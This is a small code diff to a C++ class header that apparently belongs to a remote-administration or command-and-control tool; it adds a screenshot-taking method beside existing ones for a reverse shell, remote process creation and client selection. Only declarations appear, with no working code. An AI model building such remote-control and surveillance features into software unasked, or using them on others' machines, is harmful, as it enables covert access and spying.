@@ -24,6 +24,7 @@ private:
 	void SendChatMessage() const;
 	void SendCreateProcess() const;
 	void SendReverseShell();
+	void SendTakeScreenshot();
 	void ListClients() const;
 	void SelectClient();
 
